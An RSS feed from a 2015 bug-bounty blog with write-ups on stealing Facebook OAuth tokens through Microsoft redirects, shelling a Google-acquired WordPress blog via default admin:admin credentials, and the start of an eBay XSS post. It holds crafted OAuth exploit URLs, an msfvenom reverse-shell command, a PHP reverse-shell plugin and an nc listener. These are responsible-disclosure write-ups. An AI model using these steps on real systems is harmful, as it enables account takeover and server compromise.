<?xml version="1.0"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title></title>
    <link>https://r0rshark.github.io</link>
    <atom:link href="https://r0rshark.github.io/feed.xml" rel="self" type="application/rss+xml" />
    <description></description>
    <language>en-us</language>
    <pubDate>Tue, 15 Sep 2015 17:00:39 +0000</pubDate>
    <lastBuildDate>Tue, 15 Sep 2015 17:00:39 +0000</lastBuildDate>

    
    
    <item>
      <title>Stealing OAuth tokens in Microsoft Web applications</title>
      <link>https://r0rshark.github.io/2015/09/15/microsoft/</link>
      <pubDate>Tue, 15 Sep 2015 00:00:00 +0000</pubDate>
      <author></author>
      <guid>https://r0rshark.github.io/2015/09/15/microsoft</guid>
      <description>&lt;h3 id=&quot;tldr&quot;&gt;TL;DR&lt;/h3&gt;
&lt;p&gt;The Connect with Facebook functionality of Microsoft is vulnerable to the OAuth Covert Redirect attack.
The &lt;code&gt;redirect_uri&lt;/code&gt; parameter can be modified by the attacker making the Facebook OAuth token leak to a domain not controlled by Microsoft and in this way steal user private information accessible through the token.&lt;/p&gt;

&lt;h3 id=&quot;oauth-guide&quot;&gt;OAUTH GUIDE&lt;/h3&gt;

&lt;p&gt;A basic undestanding of the OAuth flow is useful to better understand this post, a very good guide can be found &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2&quot;&gt;here&lt;/a&gt;. When reading the guide focus the attention on &lt;em&gt;“Grant Type: Authorization Code”&lt;/em&gt; and the &lt;em&gt;“Grant Type: Implicit”&lt;/em&gt; which are by far the most common approaches.&lt;/p&gt;

&lt;h3 id=&quot;probing-for-wide-redirecturi&quot;&gt;PROBING FOR WIDE REDIRECT_URI&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;redirect_uri&lt;/code&gt; parameter is very important because it represents the url to which the &lt;strong&gt;authorization_code/access_token&lt;/strong&gt; (based on Grant Type) is sent. If we are able to change the value of the &lt;code&gt;redirect_uri&lt;/code&gt; and not to make the OAuth flow to fail (because of authenticity checks on the &lt;code&gt;redirect_uri&lt;/code&gt;) we could leak the token/code to a domain controlled by us.
Original Oauth request:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;https://www.facebook.com/v2.0/dialog/oauth?client_id=441348565910475&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;&amp;amp;redirect_uri=&lt;/code&gt;&lt;strong&gt;https://profile.live.com/cid-847183e5db31faa2/services&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;&amp;amp;scope=user_photos&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Possible redirect_url:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Completely different domain&lt;/strong&gt;:  redirect_uri=&lt;code&gt;https://attacker.com&lt;/code&gt;;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Different subdomain&lt;/strong&gt;: redirect_uri=https://&lt;code&gt;xxx.live.com&lt;/code&gt;/cid-847183e5db31faa2/services;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Different folder&lt;/strong&gt;: redirect_uri= https://profile.live.com&lt;code&gt;/xxx&lt;/code&gt;;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The use of a completely different domain is very unlikely to work while in some cases the use of a different folder or subdomain is allowed. Our current payload is:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;https://www.facebook.com/v2.0/dialog/oauth?client_id=441348565910475&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;&amp;amp;redirect_uri=&lt;/code&gt;&lt;strong&gt;https://xxx.live.com/xxx&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;&amp;amp;scope=user_photos&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;searching-for-open-redirect&quot;&gt;SEARCHING FOR OPEN REDIRECT&lt;/h3&gt;
&lt;p&gt;The ability to leak the the token/code to a different subdomain/folder is not useful per se, however it provides to the attacker &lt;strong&gt;a wider attack surface&lt;/strong&gt; to find an Open Redirect vulnerability. An Open Redirect endpoint is a url which redirects the user to a parameter value without any validation. The idea is to &lt;strong&gt;find an Open Redirect in *.live.com/*&lt;/strong&gt; which would leak the token to a domain that we can control.&lt;/p&gt;

&lt;p&gt;After some google dorking I have noticed that the endpoint:
  &lt;code&gt;g.live.com/0HE_TRACKSTAR_ENUS9/&amp;lt;number&amp;gt;&lt;/code&gt; issues a 302 Redirect to external domains based on  &lt;code&gt;&amp;lt;number&amp;gt;&lt;/code&gt;.&lt;br /&gt;
For example &lt;code&gt;g.live.com/0HE_TRACKSTAR_ENUS9/1&lt;/code&gt;&lt;br /&gt;
redirects to &lt;code&gt;http://www.msn.com/it-it/&lt;/code&gt;&lt;br /&gt;
Through a 30 line of ruby script I have enumerated the possible domains to which I could leak the token&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;net/http&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;uri&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;cgi&amp;#39;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;url_brute.rb &amp;lt;url to bruteforce&amp;gt; &amp;lt;start number&amp;gt; &amp;lt;end number&amp;gt; &amp;lt;file where to write&amp;gt;&amp;quot;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ending&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ending&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;begin&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;found_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Location&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_s&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;rescue&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;found_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; Timeout&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;next&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;found_url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_url&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Among these domains there are some which can be purchased like  g.live.com/0HE_TRACKSTAR_CSCZ9/75011  which redirects to  http://staysafe.org/ .
Making the  user issue a GET request to &lt;code&gt;https://www.facebook.com/v2.0/dialog/oauth?redirect_uri=http://g.live.com/0HE_TRACKSTAR_CSCZ9/75011&amp;amp;display=popup&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;&amp;amp;scope=user_photos+user_videos&amp;amp;client_id=441348565910475&amp;amp;ret=login&lt;/code&gt; will leak the token/code to  &lt;em&gt;http://staysafe.org/&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&quot;changing-the-flow&quot;&gt;CHANGING THE FLOW&lt;/h3&gt;
&lt;p&gt;Referencing to the guide that I have pointed out before the &lt;code&gt;Grant Type&lt;/code&gt; used by Microsoft is the &lt;code&gt;Authorization Code&lt;/code&gt; one. Using the exploit we can leak the &lt;code&gt;Authorization Code&lt;/code&gt; but in order to access the protected information we need to exchange the &lt;code&gt;Authorization code&lt;/code&gt; with the &lt;code&gt;Access Token&lt;/code&gt;. However in order achieve this we need to know the &lt;code&gt;client_secret&lt;/code&gt; which we aren’t able to get since it is stored on the Microsoft servers. In order to bypass this limitation we can change &lt;code&gt;Grant Type&lt;/code&gt; to the &lt;code&gt;Implicit&lt;/code&gt; one which directly provides the &lt;code&gt;Access Token&lt;/code&gt; to the url in the redirect_url field.
With the Facebook SDK this can be done by &lt;strong&gt;adding the parameter response_type=token&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;stealing-the-token&quot;&gt;STEALING THE TOKEN&lt;/h3&gt;
&lt;p&gt;An attaker could:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Purchased the domain &lt;code&gt;http://staysafe.org/&lt;/code&gt;;&lt;/li&gt;
  &lt;li&gt;Insert a small javascript script at staysafe.org to get the window.location.hash and parse it to &lt;code&gt;extract the token&lt;/code&gt;;&lt;/li&gt;
  &lt;li&gt;Make the victim issue a GET request to &lt;code&gt;https://www.facebook.com/v2.0/dialog/oauth?redirect_uri=http://g.live.com/0HE_TRACKSTAR_CSCZ9/75011&amp;amp;display=popup&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;&amp;amp;scope=user_photos+user_videos&amp;amp;client_id=441348565910475&amp;amp;ret=login&amp;amp;response_type=token&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;trigger-the-exploit-without-interaction&quot;&gt;TRIGGER THE EXPLOIT WITHOUT INTERACTION&lt;/h3&gt;
&lt;p&gt;The Connect with Facebook functionality can be used in the &lt;code&gt;Microsoft Sway application&lt;/code&gt; where I found a second vulnerability which would allow an attaker to make the user issue arbitrary GET requests by just viewing a &lt;code&gt;&quot;sway&quot;&lt;/code&gt;.
This is possible because, crafting a particular request in the Add image functionality, an attacker is able to persistently control the &lt;code&gt;src attribute of an img tag&lt;/code&gt;. I tried to exploit this kind of vulnerability to get an XSS however the quotes were escaped and the &lt;code&gt;javascript:alert(1)&lt;/code&gt; payload in the img src attribute doesn’t work in the modern browsers. However we can use this vulnerability to automatically make the user issue our “exploit GET request” triggering our exploit as soon as he view a maliciously crafted &lt;code&gt;&quot;sway&quot;&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;full zoomable&quot;&gt;
  &lt;img src=&quot;/images/microsoft/sway_poc.png&quot; /&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;15 May 2015 Vulnerability reported to the Microsoft Security Team&lt;/li&gt;
  &lt;li&gt;4 August 2015 Vulnerability patched&lt;/li&gt;
  &lt;li&gt;25 August 2015 Got reward of 1000$&lt;/li&gt;
&lt;/ul&gt;

</description>
    </item>
    
    
    
    <item>
      <title>Getting a shell on a Google Acquisition</title>
      <link>https://r0rshark.github.io/2015/07/30/google/</link>
      <pubDate>Thu, 30 Jul 2015 00:00:00 +0000</pubDate>
      <author></author>
      <guid>https://r0rshark.github.io/2015/07/30/google</guid>
      <description>&lt;h3 id=&quot;tldr&quot;&gt;TL;DR&lt;/h3&gt;
&lt;p&gt;Default Wordpress credentials on an old version of the Adometry blog would have allowed an attacker to upload a PHP shell and execute remote commands.&lt;/p&gt;

&lt;h3 id=&quot;google-dorking&quot;&gt;Google dorking&lt;/h3&gt;
&lt;p&gt;Instead of studying for the exams last month I tryed to discover some bugs in a Google Acquisition to get my name listed on the &lt;strong&gt;Google Hall of Fame&lt;/strong&gt;. The acquisition which I have targeted is &lt;strong&gt;Adometry by Google&lt;/strong&gt; a SaaS-based marketing attribution and optimization platform. Looking around on their website I have discovered the company blog located at &lt;a href=&quot;http://www.adometry.com/blog/&quot;&gt;http://www.adometry.com/blog/&lt;/a&gt; which runs the &lt;strong&gt;latest version of Wordpress&lt;/strong&gt;.
Since the bugs are often located in hidden and old pages of the website let’s give them a look. A very useful way to discover these pages is Google itself. Using some operands like &lt;code&gt;site:&lt;/code&gt; or &lt;code&gt;inurl:&lt;/code&gt; and combining these with the &lt;code&gt;interval of dates filter&lt;/code&gt; it is possible to discover old pages of a particular website. Let’s try it: &lt;code&gt;site:adometry.com&lt;/code&gt; and set the interval of date in the past but not that much. Besides the pages which simply redirect to the main website I have noticed something strange:&lt;/p&gt;

&lt;div class=&quot;full zoomable&quot;&gt;
  &lt;img src=&quot;/images/google/blog2013.png&quot; /&gt;
&lt;/div&gt;

&lt;h3 id=&quot;the-wordpress-test-blog&quot;&gt;The Wordpress test blog&lt;/h3&gt;
&lt;p&gt;The first thing that I have noticed was the title of the blog  &lt;strong&gt;Test | Just another WordPress site - Adometry&lt;/strong&gt; which contains the magic keyword that every Penetration Tester/Bug Hunter is looking for: &lt;strong&gt;Test&lt;/strong&gt; that in many cases means vulnerable as hell. The second thing that I have noticed is that the url of this blog &lt;a href=&quot;http://www.adometry.com/blog2013/&quot;&gt;http://www.adometry.com/blog2013/&lt;/a&gt; is different from the official one that I have discovered before. By inspecting the source code of the page I discovered that the &lt;strong&gt;Wordpress version was the 3.5.1&lt;/strong&gt; that has a lot of vulnerabilities like XSS XXE CSRF and maybe a &lt;a href=&quot;https://vagosec.org/2013/12/wordpress-rce-exploit/&quot;&gt;RCE&lt;/a&gt;, but  I am a lazy guy, out there it was very hot, and I would like to go for a swim so I tryed to find an easier way in. I know for sure this was just a testing blog and so what are the &lt;strong&gt;classical credetials&lt;/strong&gt; for a testing thing? The default ones and in the case of Wordpress the classical &lt;strong&gt;admin:admin&lt;/strong&gt;. Let’s give them a shot and here we are:&lt;/p&gt;

&lt;div class=&quot;full zoomable&quot;&gt;
  &lt;img src=&quot;/images/google/wordpress.png&quot; /&gt;
&lt;/div&gt;

&lt;h3 id=&quot;getting-a-shell&quot;&gt;Getting a shell&lt;/h3&gt;
&lt;p&gt;The easiest way to get a shell once you have admin access to a Wordpress blog is to &lt;strong&gt;upload a custom plugin&lt;/strong&gt; containing a reverse shell, enable it and visit the page which runs it:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Create a &lt;strong&gt;php reverse shell&lt;/strong&gt; using msfvenom and name the file shell.php:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;
msfvenom -p php/meterpreter_reverse_tcp LHOST=Your IP LPORT=Your Port -f raw &amp;gt; shell.php
&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Add comments on the top of the shell.php to &lt;strong&gt;make it a valid plugin&lt;/strong&gt; and compress it in zip format&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;*     Plugin Name: My Shell&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;*     Plugin URI: https://github.com/r0rshark/wordpress-shell&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;*     Description: Execute Commands as the webserver you are serving wordpress with&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;*     Author: r0rshark&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;*     Version: 0.2&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;*     Author URI: https://r0rshark.github.io&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;*                             */&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ipaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;Your IP&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Your&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set_time_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ignore_user_abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;max_execution_time&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ini_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;disable_functions&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Upload and enable the plugin&lt;/strong&gt; in the Wordpress dashboard&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;full zoomable&quot;&gt;
  &lt;img src=&quot;/images/google/wordpress_plugin.png&quot; /&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Setup a listener&lt;/strong&gt; at your ip and port used in the msfvenom command:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;
nc -lvp port
&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Execute the reverse shell&lt;/strong&gt; by visiting www.adometry.com/blog2013/wp-content/plugins/shell/shell.php&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;full zoomable&quot;&gt;
  &lt;img src=&quot;/images/google/shell.png&quot; /&gt;
&lt;/div&gt;

&lt;h3 id=&quot;maybe-getting-root&quot;&gt;Maybe getting root&lt;/h3&gt;
&lt;p&gt;In the previous picture it is possible to see the current kernel version running on that machine which is the &lt;strong&gt;2.6.32&lt;/strong&gt;. I think that there are known &lt;strong&gt;public exploits&lt;/strong&gt; to get a root shell exploiting vulnerabilities in this kernel version. For example I have tested  &lt;a href=&quot;https://www.exploit-db.com/exploits/15704/&quot;&gt;this&lt;/a&gt; on a 2.6.31 kernel and since the exploit has been created to work with kernel &amp;lt; 2.6.37 I suppose that it can work as well. Obviously I haven’t tried it because I think this would go beyond of the Bug Bounty scope.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1 July 2015 Vulnerability reported to the Google Security Team&lt;/li&gt;
  &lt;li&gt;2 July 2015 Vulnerability patched&lt;/li&gt;
  &lt;li&gt;9 July 2015 Got reward of $3133.7&lt;/li&gt;
&lt;/ul&gt;

</description>
    </item>
    
    
    
    <item>
      <title>Making you sell what I want: Story of an Ebay XSS</title>
      <link>https://r0rshark.github.io/2015/06/19/ebay/</link>
      <pubDate>Fri, 19 Jun 2015 00:00:00 +0000</pubDate>
      <author></author>
      <guid>https://r0rshark.github.io/2015/06/19/ebay</guid>
      <description>&lt;h3 id=&quot;tldr&quot;&gt;TL;DR&lt;/h3&gt;
&lt;p&gt;A XSS vulnerability in Ebay can be exploited by an attacker to bypass CSRF protection and make a victim sell unwanted items.
This is a pretty basic technique but it could be interesting for people which have just entered in the Bug Bounty world.&lt;/p&gt;

&lt;h3 id=&quot;xss-on-ebay&quot;&gt;XSS on Ebay&lt;/h3&gt;
&lt;p&gt;Let’s talk about my first bug hunting experience.
First of all why have I chosen to test Ebay? Simple:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The Ebay website was first &lt;strong&gt;developed lots of time ago&lt;/strong&gt; when the word &lt;code&gt;&quot;security&quot;&lt;/code&gt; was not so popular and there weren’t beatiful frameworks which prevents developers to make shit happen;&lt;/li&gt;
